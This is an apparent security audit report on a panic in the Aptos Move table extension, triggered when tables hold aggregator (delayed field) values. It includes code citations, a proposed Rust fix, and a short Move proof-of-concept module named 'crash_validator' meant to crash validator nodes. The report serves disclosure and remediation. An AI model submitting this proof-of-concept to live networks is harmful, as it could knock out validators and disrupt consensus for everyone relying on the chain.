# Audit Report

## Title
Validator Node Panic via Table Extension with Aggregator Types (Delayed Fields)

## Summary
The move-table-extension's `get_or_create_table` function contains an unsafe `.expect()` call that panics when tables are created with aggregator types (delayed fields) as values, allowing an attacker to crash validator nodes and disrupt consensus.

## Finding Description
The vulnerability exists in the table extension's layout construction logic. When a table is created with an aggregator type (such as `Aggregator<u64>` or `AggregatorSnapshot<u64>`) as the value type, the native function attempts to construct the type layout for serialization. [1](#0-0) 

The `into_layout_when_has_no_delayed_fields()` method returns `None` when the layout contains delayed fields (aggregator types use `MoveTypeLayout::Native` which are delayed fields): [2](#0-1) 

Aggregator types are marked with delayed fields during layout construction: [3](#0-2) 

The attack path:
1. Attacker creates a Move module that instantiates `Table<address, Aggregator<u64>>` using the table extension
2. Attacker calls `table::add()` to insert a value into the table
3. The native `add_box` function calls `get_or_create_table()` with the aggregator type
4. The layout construction returns delayed fields, causing `.into_layout_when_has_no_delayed_fields()` to return `None`
5. The `.expect()` call panics the validator node

This is possible because `Aggregator<IntElement>` has the `store` ability required for table values: [4](#0-3) 

And tables only require `V: store` for values: [5](#0-4) 

## Impact Explanation
**Severity: High**

This vulnerability breaks the **Deterministic Execution** invariant. When validators process a transaction that triggers this panic:
- The validator node crashes with a panic
- Other validators may or may not have processed the transaction before the crash
- This causes consensus disruption as validators cannot agree on block execution
- Repeated attacks could cause persistent denial of service

The impact qualifies as **High Severity** per Aptos bug bounty criteria:
- Causes validator node crashes (matches "Validator node slowdowns" but worse)
- Creates significant protocol violations (consensus disruption)
- Does not directly steal funds but disrupts network availability

## Likelihood Explanation
**Likelihood: Medium-High**

The attack is straightforward to execute:
- Requires no special privileges (any transaction sender can do it)
- Only requires writing a simple Move module that uses aggregators with tables
- The aggregator_v2 feature must be enabled for delayed fields to be present
- No complex timing or race conditions required

The main limiting factor is that this requires the aggregator v2 feature to be enabled in production. However, once enabled, this becomes a trivial DoS attack vector.

## Recommendation
Replace the `.expect()` calls with proper error handling that returns a `PartialVMResult` error instead of panicking:

```rust
fn get_or_create_table(
    &mut self,
    loader_context: &mut LoaderContext,
    handle: TableHandle,
    key_ty: &Type,
    value_ty: &Type,
) -> PartialVMResult<&mut Table> {
    Ok(match self.tables.entry(handle) {
        Entry::Vacant(e) => {
            let key_layout = loader_context
                .type_to_type_layout_with_delayed_fields(key_ty)?
                .into_layout_when_has_no_delayed_fields()
                .ok_or_else(|| {
                    PartialVMError::new(StatusCode::FEATURE_UNDER_GATING)
                        .with_message("Table keys cannot contain delayed fields (aggregators)".to_string())
                })?;
            let value_layout = loader_context
                .type_to_type_layout_with_delayed_fields(value_ty)?
                .into_layout_when_has_no_delayed_fields()
                .ok_or_else(|| {
                    PartialVMError::new(StatusCode::FEATURE_UNDER_GATING)
                        .with_message("Table values cannot contain delayed fields (aggregators)".to_string())
                })?;
            let table = Table {
                handle,
                key_layout,
                value_layout,
                content: Default::default(),
            };
            e.insert(table)
        },
        Entry::Occupied(e) => e.into_mut(),
    })
}
```

Additionally, consider adding type constraints in the Move table module to prevent aggregator types from being used as table keys/values at compile time.

## Proof of Concept
```move
module 0x42::exploit {
    use std::table;
    use aptos_framework::aggregator_v2;
    
    public entry fun crash_validator(sender: &signer) {
        // Create a table with Aggregator as value type
        let t = table::new<address, aggregator_v2::Aggregator<u64>>();
        
        // Create an aggregator
        let agg = aggregator_v2::create_aggregator<u64>(1000);
        
        // Try to add the aggregator to the table
        // This will panic the validator node at get_or_create_table()
        table::add(&mut t, @0x1, agg);
        
        // Clean up (never reached due to panic)
        table::destroy_empty(t);
    }
}
```

When this transaction is executed, the validator will panic with:
```
thread 'main' panicked at 'Move extension has no delayed fields', third_party/move/extensions/move-table-extension/src/lib.rs:237
```

**Notes:**
- This vulnerability only manifests when aggregator v2 delayed fields feature is enabled
- The same issue affects all table native operations (add_box, borrow_box, etc.)
- Similar `.expect()` patterns should be audited elsewhere in the codebase for delayed field handling

### Citations

**File:** third_party/move/extensions/move-table-extension/src/lib.rs (L234-241)
```rust
                let key_layout = loader_context
                    .type_to_type_layout_with_delayed_fields(key_ty)?
                    .into_layout_when_has_no_delayed_fields()
                    .expect("Move extension has no delayed fields");
                let value_layout = loader_context
                    .type_to_type_layout_with_delayed_fields(value_ty)?
                    .into_layout_when_has_no_delayed_fields()
                    .expect("Move extension has no delayed fields");
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L42-44)
```rust
    pub fn into_layout_when_has_no_delayed_fields(self) -> Option<TriompheArc<MoveTypeLayout>> {
        (!self.contains_delayed_fields).then_some(self.layout)
    }
```

**File:** third_party/move/move-vm/runtime/src/storage/ty_layout_converter.rs (L528-562)
```rust
                    (Some(kind), false) => {
                        // Note: for delayed fields, simply never output annotated layout. The
                        // callers should not be able to handle it in any case.

                        use IdentifierMappingKind::*;
                        let layout = match &kind {
                            // For derived strings, replace the whole struct.
                            DerivedString => {
                                let inner_layout =
                                    MoveTypeLayout::Struct(MoveStructLayout::new(field_layouts));
                                MoveTypeLayout::Native(kind, Box::new(inner_layout))
                            },
                            // For aggregators and snapshots, we replace the layout of its first
                            // field only.
                            Aggregator | Snapshot => match field_layouts.first_mut() {
                                Some(field_layout) => {
                                    *field_layout = MoveTypeLayout::Native(
                                        kind,
                                        Box::new(field_layout.clone()),
                                    );
                                    MoveTypeLayout::Struct(MoveStructLayout::new(field_layouts))
                                },
                                None => {
                                    let struct_name = self.get_struct_name(idx)?;
                                    let msg = format!(
                                        "Struct {}::{}::{} must contain at least one field",
                                        struct_name.module().address,
                                        struct_name.module().name,
                                        struct_name.name(),
                                    );
                                    return Err(PartialVMError::new_invariant_violation(msg));
                                },
                            },
                        };
                        (layout, true)
```

**File:** aptos-move/framework/aptos-framework/sources/aggregator_v2/aggregator_v2.move (L51-54)
```text
    struct Aggregator<IntElement> has store, drop {
        value: IntElement,
        max_value: IntElement,
    }
```

**File:** third_party/move/extensions/move-table-extension/sources/Table.move (L13-16)
```text
    struct Table<phantom K: copy + drop, phantom V> has store {
        handle: address,
        length: u64,
    }
```
